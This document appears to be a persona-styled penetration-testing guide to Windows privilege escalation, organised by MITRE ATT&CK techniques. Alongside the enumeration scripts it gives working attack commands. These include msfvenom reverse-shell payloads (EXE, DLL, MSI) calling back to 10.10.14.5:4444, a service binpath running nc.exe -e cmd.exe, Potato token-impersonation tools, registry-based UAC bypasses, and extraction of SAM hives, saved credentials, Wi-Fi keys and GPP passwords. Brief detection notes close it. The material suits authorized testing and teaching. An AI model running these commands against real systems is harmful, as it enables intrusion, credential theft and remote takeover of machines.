# GS-20: Windows Privilege Escalation — Every Vector — Rush (Royal Guard)

> **Classification**: Palace Security Knowledge Seed
> **Author**: Rush — The Breacher (Network Penetration)
> **Source**: MITRE ATT&CK TA0004 (Privilege Escalation), PayloadsAllTheThings, HackTricks, OSCP
> **Last Updated**: 2026-03-09

---

## 1. Privilege Escalation Philosophy

You have a shell. It's low-privilege. The target is SYSTEM or Administrator. Between you and
that target are dozens of possible misconfigurations, each one a stepping stone. This seed
covers EVERY major Windows privesc vector with PowerShell enumeration commands for each.

**MITRE ATT&CK TA0004 Techniques Covered:**
- T1574.001 — DLL Search Order Hijacking
- T1574.002 — DLL Side-Loading
- T1574.009 — Unquoted Service Paths
- T1134 — Access Token Manipulation
- T1053 — Scheduled Task/Job Abuse
- T1546 — Event Triggered Execution (Autorun)
- T1547 — Boot/Logon Autostart Execution
- T1055 — Process Injection
- T1548.002 — Bypass UAC
- T1552 — Unsecured Credentials

---

## 2. Initial Enumeration

### 2.1 System Information

```powershell
# Basic system info
systeminfo
whoami /all
hostname
[System.Environment]::OSVersion

# Check architecture (32 vs 64 bit)
[Environment]::Is64BitOperatingSystem

# Installed patches — look for MISSING patches
wmic qfe list full /format:table
# Or in PowerShell:
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20

# Check if we're in a VM (different attack surface)
wmic computersystem get model,manufacturer
systeminfo | findstr /i "virtual vmware"
```

### 2.2 Current Privileges

```powershell
# Full token information
whoami /priv
whoami /groups

# Key privileges to look for:
# SeImpersonatePrivilege      -> Potato attacks (PrintSpoofer, GodPotato)
# SeAssignPrimaryTokenPrivilege -> Potato attacks
# SeBackupPrivilege           -> Read any file (SAM, SYSTEM hives)
# SeRestorePrivilege          -> Write any file
# SeDebugPrivilege            -> Process injection, memory dumps
# SeTakeOwnershipPrivilege    -> Take ownership of any object
# SeLoadDriverPrivilege       -> Load kernel drivers
# SeCreateTokenPrivilege      -> Create arbitrary tokens
```

### 2.3 Automated Enumeration Tools

```powershell
# WinPEAS — the gold standard
.\winPEASx64.exe

# PowerUp (PowerSploit)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# SharpUp
.\SharpUp.exe audit

# PrivescCheck (pure PowerShell, no binary needed)
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
```

---

## 3. Unquoted Service Paths (T1574.009)

### 3.1 Theory

If a Windows service binary path contains spaces and is NOT quoted, Windows will try to
execute intermediate paths. Example:

Path: `C:\Program Files\My App\Service\binary.exe`

Windows tries in order:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My App\Service\binary.exe`

If you can write to any intermediate directory, you can place a malicious executable there.

### 3.2 Enumeration

```powershell
# Find all unquoted service paths
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notlike '"*' -and
    $_.PathName -notlike 'C:\Windows\*' -and
    $_.PathName -match '\s'
} | Select-Object Name, DisplayName, StartMode, PathName, StartName

# Alternative with wmic
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Check write permissions on intermediate directories
icacls "C:\Program Files\My App"
# Look for: (BUILTIN\Users):(OI)(CI)(M) or (W) or (F)

# PowerUp automated check
Get-UnquotedService
```

### 3.3 Exploitation

```powershell
# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o My.exe

# Copy to intermediate path
copy My.exe "C:\Program Files\My.exe"

# Restart the service (if you have permission)
Restart-Service "VulnerableService"

# If no restart permission, wait for system reboot (services with Auto start)
# Check start type:
Get-Service "VulnerableService" | Select-Object Name, StartType
```

---

## 4. Weak Service Permissions

### 4.1 Service Binary Permissions

```powershell
# Check if current user can modify service binaries
Get-WmiObject Win32_Service | ForEach-Object {
    $path = ($_.PathName -split '"')[1]
    if (-not $path) { $path = ($_.PathName -split ' ')[0] }
    $acl = Get-Acl $path -ErrorAction SilentlyContinue
    if ($acl) {
        $acl.Access | Where-Object {
            $_.IdentityReference -match 'Users|Everyone|Authenticated' -and
            $_.FileSystemRights -match 'Write|Modify|FullControl'
        } | ForEach-Object {
            [PSCustomObject]@{
                Service = $_.PathName
                Identity = $_.IdentityReference
                Rights = $_.FileSystemRights
            }
        }
    }
}

# Using accesschk from Sysinternals
accesschk.exe -uwcv "Everyone" * -accepteula
accesschk.exe -uwcv "Users" * -accepteula
accesschk.exe -uwcv "Authenticated Users" * -accepteula
```

### 4.2 Service Configuration Permissions

```powershell
# Check if we can RECONFIGURE services (change binary path)
accesschk.exe -uwcv "Users" * -accepteula
# Look for: SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS

# If we can change config, replace the binary path
sc config "VulnerableService" binpath= "C:\temp\reverse.exe"
sc stop "VulnerableService"
sc start "VulnerableService"

# Or for a quick reverse shell without dropping a binary:
sc config "VulnerableService" binpath= "cmd /c C:\temp\nc.exe -e cmd.exe 10.10.14.5 4444"

# PowerUp automated exploitation
Invoke-ServiceAbuse -Name 'VulnerableService'
```

### 4.3 Service Registry Permissions

```powershell
# Services are registered in HKLM\SYSTEM\CurrentControlSet\Services
# Check if we can modify the registry key
Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\VulnerableService" | Format-List

# Subinacl check
subinacl /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnerableService" /display

# If writable, change the ImagePath value
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnerableService" -Name ImagePath -Value "C:\temp\reverse.exe"
```

---

## 5. DLL Hijacking (T1574.001 / T1574.002)

### 5.1 Theory

Windows searches for DLLs in a specific order. If an application loads a DLL without a full
path, we can place a malicious DLL earlier in the search order.

**Standard DLL Search Order:**
1. Directory from which the application loaded
2. System directory (C:\Windows\System32)
3. 16-bit system directory (C:\Windows\System)
4. Windows directory (C:\Windows)
5. Current directory
6. Directories in PATH environment variable

### 5.2 Finding DLL Hijack Opportunities

```powershell
# Use Process Monitor (ProcMon) to find missing DLLs
# Filter: Result = "NAME NOT FOUND" AND Path ends with ".dll"
# This shows every DLL that a process tried to load but couldn't find

# Automated DLL hijack finder
# Check which directories in PATH are writable
$env:PATH -split ';' | ForEach-Object {
    $path = $_
    try {
        $acl = Get-Acl $path -ErrorAction SilentlyContinue
        $acl.Access | Where-Object {
            $_.IdentityReference -match 'Users|Everyone|Authenticated' -and
            $_.FileSystemRights -match 'Write|Modify|FullControl'
        } | ForEach-Object {
            Write-Host "[WRITABLE] $path - $($_.IdentityReference): $($_.FileSystemRights)" -ForegroundColor Red
        }
    } catch {}
}

# Common DLL hijack targets (services/programs that load missing DLLs)
# Check program directories for write access
Get-ChildItem "C:\Program Files" -Directory | ForEach-Object {
    $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
    $acl.Access | Where-Object {
        $_.IdentityReference -match 'Users|Everyone' -and
        $_.FileSystemRights -match 'Write|Modify|FullControl'
    } | ForEach-Object {
        Write-Host "[WRITABLE] $($_.FullName)" -ForegroundColor Yellow
    }
}
```

### 5.3 DLL Hijack Exploitation

```powershell
# Generate a malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o hijack.dll

# Place in writable directory that's in the search path
copy hijack.dll "C:\WritableAppDir\targetdll.dll"

# Trigger: restart the service or wait for the application to load
# Proxy DLL approach (maintain functionality + get shell):
# Use DLL proxying to forward legitimate calls while executing payload
```

---

## 6. AlwaysInstallElevated

### 6.1 Theory

If both of these registry keys are set to 1, ANY user can install MSI packages with SYSTEM
privileges. This is a critical misconfiguration.

### 6.2 Enumeration

```powershell
# Check both registry locations (BOTH must be 1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerShell check
$hklm = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
$hkcu = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue

if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
    Write-Host "[!!!] AlwaysInstallElevated is ENABLED — trivial SYSTEM shell" -ForegroundColor Red
}

# PowerUp check
Get-RegistryAlwaysInstallElevated
```

### 6.3 Exploitation

```bash
# Generate malicious MSI (from Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi

# Install on target (will run as SYSTEM)
msiexec /quiet /qn /i C:\temp\evil.msi
```

---

## 7. Stored Credentials (T1552)

### 7.1 Windows Credential Manager

```powershell
# List stored credentials
cmdkey /list

# If credentials are stored, use them with runas
runas /savecred /user:CORP\administrator "cmd.exe /c C:\temp\reverse.exe"

# PowerShell credential extraction
[System.Runtime.InteropServices.Marshal]::PtrToStringAuto(
    [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR(
        (Get-StoredCredential -Target "targetname").Password
    )
)
```

### 7.2 Unattend / Sysprep Files

```powershell
# These files often contain plaintext or base64-encoded admin passwords
$locations = @(
    "C:\unattend.xml",
    "C:\Windows\Panther\unattend.xml",
    "C:\Windows\Panther\Unattend\Unattend.xml",
    "C:\Windows\system32\sysprep\sysprep.xml",
    "C:\Windows\system32\sysprep\Panther\unattend.xml",
    "C:\Windows\system32\sysprep.inf",
    "C:\Windows\Panther\Unattend\Unattended.xml"
)

$locations | ForEach-Object {
    if (Test-Path $_) {
        Write-Host "[FOUND] $_" -ForegroundColor Red
        Select-String -Path $_ -Pattern "password|Password|credential" -Context 2
    }
}
```

### 7.3 SAM and SYSTEM Hive Backup

```powershell
# Check for backup copies of SAM/SYSTEM (contain local password hashes)
$backups = @(
    "C:\Windows\repair\SAM",
    "C:\Windows\repair\SYSTEM",
    "C:\Windows\System32\config\RegBack\SAM",
    "C:\Windows\System32\config\RegBack\SYSTEM"
)

$backups | ForEach-Object {
    if (Test-Path $_) {
        Write-Host "[FOUND] $_ — EXTRACT HASHES" -ForegroundColor Red
    }
}

# If SeBackupPrivilege is available, copy live hives
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Extract hashes (on Kali)
# python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### 7.4 Group Policy Preferences (GPP / cPassword)

```powershell
# GPP passwords were encrypted with a known AES key (Microsoft published the key)
# MS14-025 patched the ability to SET these, but old ones may still exist

# Search for Groups.xml, Services.xml, ScheduledTasks.xml, etc.
Get-ChildItem -Path "\\$env:USERDNSDOMAIN\SYSVOL" -Recurse -Include "Groups.xml","Services.xml","ScheduledTasks.xml","DataSources.xml","Printers.xml","Drives.xml" -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Host "[FOUND] $($_.FullName)" -ForegroundColor Red
    Select-String -Path $_.FullName -Pattern "cpassword" -Context 2
}

# Decrypt with gpp-decrypt (Kali)
# gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

# PowerSploit automated
Get-GPPPassword
```

### 7.5 Other Credential Locations

```powershell
# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="WiFiName" key=clear

# IIS web.config
Get-ChildItem -Path "C:\inetpub" -Recurse -Include "web.config" | ForEach-Object {
    Select-String -Path $_.FullName -Pattern "connectionString|password|pwd" -Context 1
}

# PowerShell history
Get-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Putty saved sessions (may contain passwords or SSH keys)
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# SNMP community strings
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"

# Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# McAfee SiteList.xml
Get-ChildItem -Path "C:\" -Recurse -Include "SiteList.xml" -ErrorAction SilentlyContinue

# KeePass databases
Get-ChildItem -Path "C:\Users" -Recurse -Include "*.kdbx" -ErrorAction SilentlyContinue
```

---

## 8. Token Impersonation — Potato Attacks

### 8.1 Theory

If you have `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` (common for service
accounts like IIS AppPool, MSSQL, etc.), you can impersonate any token including SYSTEM.

The "Potato" family of exploits tricks a SYSTEM-level process into authenticating to your
controlled endpoint, then impersonates that token.

### 8.2 PrintSpoofer

```powershell
# Works on: Windows 10 / Server 2016-2019
# Exploits the Print Spooler service to get a SYSTEM token

# Interactive SYSTEM shell
.\PrintSpoofer64.exe -i -c cmd

# Execute a specific command as SYSTEM
.\PrintSpoofer64.exe -c "C:\temp\reverse.exe"

# Execute with arguments
.\PrintSpoofer64.exe -c "cmd /c whoami > C:\temp\whoami.txt"
```

### 8.3 GodPotato

```powershell
# Works on: Windows Server 2012 - 2022, Windows 8.1 - 11
# The most reliable potato in 2025-2026. Uses DCOM/RPCSS.

# SYSTEM shell
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "C:\temp\reverse.exe"

# Choose .NET version based on target:
# GodPotato-NET2.exe  — .NET 2.0/3.5
# GodPotato-NET35.exe — .NET 3.5
# GodPotato-NET4.exe  — .NET 4.x (most common)
```

### 8.4 JuicyPotato / RoguePotato / SweetPotato

```powershell
# JuicyPotato — Windows 7/8/10, Server 2008-2016 (older but reliable)
.\JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
# -c = CLSID (varies by OS version — find valid ones at https://ohpe.it/juicy-potato/CLSID/)

# RoguePotato — Works when JuicyPotato doesn't (Server 2019+)
.\RoguePotato.exe -r 10.10.14.5 -e "C:\temp\reverse.exe" -l 9999

# SweetPotato — Combines multiple techniques
.\SweetPotato.exe -p C:\temp\reverse.exe
```

### 8.5 Checking for Impersonation Privileges

```powershell
# Quick check
whoami /priv | findstr -i "SeImpersonate SeAssignPrimaryToken"

# Common accounts with these privileges:
# - LOCAL SERVICE
# - NETWORK SERVICE
# - IIS APPPOOL\DefaultAppPool
# - NT SERVICE\MSSQL*
# - NT SERVICE\* (most services)
```

---

## 9. Scheduled Tasks Abuse (T1053.005)

```powershell
# List all scheduled tasks
schtasks /query /fo TABLE /v

# Find tasks running as SYSTEM or admin
schtasks /query /fo LIST /v | Select-String -Pattern "Run As|Task To Run|Task Name" -Context 0,0

# PowerShell enumeration
Get-ScheduledTask | Where-Object {$_.Principal.UserId -match 'SYSTEM|Administrator'} | ForEach-Object {
    $actions = $_.Actions.Execute
    [PSCustomObject]@{
        TaskName = $_.TaskName
        RunAs = $_.Principal.UserId
        Execute = $actions
        Arguments = $_.Actions.Arguments
    }
}

# Check if we can modify task binaries
Get-ScheduledTask | ForEach-Object {
    $exe = $_.Actions.Execute
    if ($exe -and (Test-Path $exe)) {
        $acl = Get-Acl $exe
        $acl.Access | Where-Object {
            $_.IdentityReference -match 'Users|Everyone' -and
            $_.FileSystemRights -match 'Write|Modify|FullControl'
        } | ForEach-Object {
            Write-Host "[WRITABLE TASK BINARY] $exe" -ForegroundColor Red
        }
    }
}

# Check if we can write to the task's directory
# If a task loads DLLs from its directory, DLL hijacking applies
```

---

## 10. Autorun Abuse (T1547.001)

### 10.1 Registry Autorun Locations

```powershell
# All common autorun registry keys
$autorunPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce",
    "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
)

$autorunPaths | ForEach-Object {
    $items = Get-ItemProperty -Path $_ -ErrorAction SilentlyContinue
    if ($items) {
        Write-Host "`n[KEY] $_" -ForegroundColor Cyan
        $items.PSObject.Properties | Where-Object {
            $_.Name -notin @('PSPath','PSParentPath','PSChildName','PSProvider')
        } | ForEach-Object {
            Write-Host "  $($_.Name) = $($_.Value)"
            # Check if we can overwrite the binary
            $binary = ($_.Value -split '"')[1]
            if (-not $binary) { $binary = ($_.Value -split ' ')[0] }
            if ($binary -and (Test-Path $binary)) {
                $acl = Get-Acl $binary -ErrorAction SilentlyContinue
                $acl.Access | Where-Object {
                    $_.IdentityReference -match 'Users|Everyone' -and
                    $_.FileSystemRights -match 'Write|Modify|FullControl'
                } | ForEach-Object {
                    Write-Host "  [WRITABLE!] $binary" -ForegroundColor Red
                }
            }
        }
    }
}
```

### 10.2 Startup Folders

```powershell
# Check startup folders for write access
$startupPaths = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
)

$startupPaths | ForEach-Object {
    Write-Host "`n[STARTUP FOLDER] $_"
    if (Test-Path $_) {
        $acl = Get-Acl $_
        $acl.Access | Where-Object {
            $_.IdentityReference -match 'Users|Everyone|Authenticated' -and
            $_.FileSystemRights -match 'Write|Modify|CreateFiles|FullControl'
        } | ForEach-Object {
            Write-Host "  [WRITABLE!] $($_.IdentityReference): $($_.FileSystemRights)" -ForegroundColor Red
        }
        Get-ChildItem $_ | ForEach-Object { Write-Host "  Existing: $($_.Name)" }
    }
}

# Drop payload in writable startup folder
# copy reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
```

---

## 11. UAC Bypass (T1548.002)

```powershell
# Check current UAC level
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
# Value 0 = No prompt (UAC disabled)
# Value 1 = Prompt for credentials on secure desktop
# Value 2 = Prompt for consent on secure desktop (default for 2+ users)
# Value 5 = Prompt for consent for non-Windows binaries (default)

# Check if we're in the Administrators group (UAC may be the only barrier)
whoami /groups | findstr "S-1-5-32-544"

# Fodhelper bypass (Windows 10/11)
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "C:\temp\reverse.exe" -Force
Start-Process fodhelper.exe
# Cleanup:
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

# Eventvwr bypass
New-Item -Path "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Name "(Default)" -Value "C:\temp\reverse.exe" -Force
Start-Process eventvwr.msc
```

---

## 12. Kernel Exploits (Last Resort)

```powershell
# Only use kernel exploits when all other vectors fail
# Match systeminfo output to known vulnerable builds

# Windows exploit suggester (run on Kali)
# python3 windows-exploit-suggester.py --database 2026-03-09-mssb.xls --systeminfo systeminfo.txt

# Watson (C# — runs ON the target)
.\Watson.exe

# Common kernel exploits still found in the wild (2024-2026):
# MS16-032 — Secondary Logon Service (Server 2008-2012)
# MS17-010 — EternalBlue (Server 2008/2012, unpatched)
# CVE-2021-1732 — Win32k Elevation (Win10 < 20H2)
# CVE-2021-36934 — HiveNightmare/SeriousSAM (Win10 1809+)
# CVE-2022-21999 — Print Spooler (multiple versions)
# CVE-2023-28252 — CLFS Driver (Win10/11, Server 2019/2022)
# PrintNightmare — CVE-2021-1675 / CVE-2021-34527
```

---

## 13. Comprehensive Enumeration Checklist

Run this checklist on every engagement. Order = highest success probability first.

| # | Vector | Command | Exploitable If |
|---|--------|---------|----------------|
| 1 | Impersonation Privs | `whoami /priv` | SeImpersonate/SeAssignPrimary = 1 |
| 2 | Stored Creds | `cmdkey /list` | Entries exist |
| 3 | AlwaysInstallElevated | `reg query HKLM\...\Installer /v AlwaysInstallElevated` | Both = 1 |
| 4 | Unquoted Service Paths | `wmic service get name,pathname` | Space + no quotes + writable dir |
| 5 | Weak Service Perms | `accesschk -uwcv Users *` | SERVICE_CHANGE_CONFIG |
| 6 | Writable Service Binary | `icacls <binary>` | Users have (M) or (W) |
| 7 | DLL Hijacking | ProcMon + `icacls` on app dirs | Missing DLL + writable dir |
| 8 | Autologon Creds | `reg query ...\Winlogon` | DefaultPassword exists |
| 9 | Unattend/Sysprep | `dir /s unattend.xml` | File exists with password |
| 10 | GPP cPassword | SYSVOL search | cpassword attribute found |
| 11 | Writable Autorun | Registry + startup folder check | Writable binary/folder |
| 12 | Scheduled Task Binary | `schtasks /query /v` + `icacls` | SYSTEM task + writable binary |
| 13 | SAM/SYSTEM Backups | Check repair/RegBack dirs | Files readable |
| 14 | UAC Bypass | `whoami /groups` | Admin group + UAC enabled |
| 15 | Kernel Exploit | `systeminfo` + Watson | Missing patches |

---

## 14. Rush's Operational Notes

**Rules for Palace privesc:**
- Always start with token privileges. If SeImpersonatePrivilege is present, use GodPotato. It's the fastest path to SYSTEM and works on modern Windows.
- NEVER use kernel exploits on production Palace systems. BSOD risk = unacceptable.
- Stored credentials (cmdkey, autologon, GPP) are free wins. Check them FIRST.
- DLL hijacking requires patience but is the stealthiest vector — no new binaries in unusual locations.
- Autorun abuse is slow (requires reboot/login) but persistent. Good for maintaining access.
- Document every vector found, even if not exploited. The report matters as much as the shell.
- PowerUp's `Invoke-AllChecks` misses things. WinPEAS misses things. The checklist above catches what tools miss.

**Detection notes for Palace defense:**
- Monitor Event ID 7045 (new service installed) — catches service binary replacement
- Monitor Sysmon Event ID 11 (file create) in service directories
- Monitor registry changes to Run/RunOnce keys (Sysmon Event ID 13)
- Monitor for new scheduled tasks (Event ID 4698)
- Patch AlwaysInstallElevated via GPO immediately if found

---

*"SYSTEM is never more than one misconfiguration away. The question is which one the admin forgot about." — Rush*
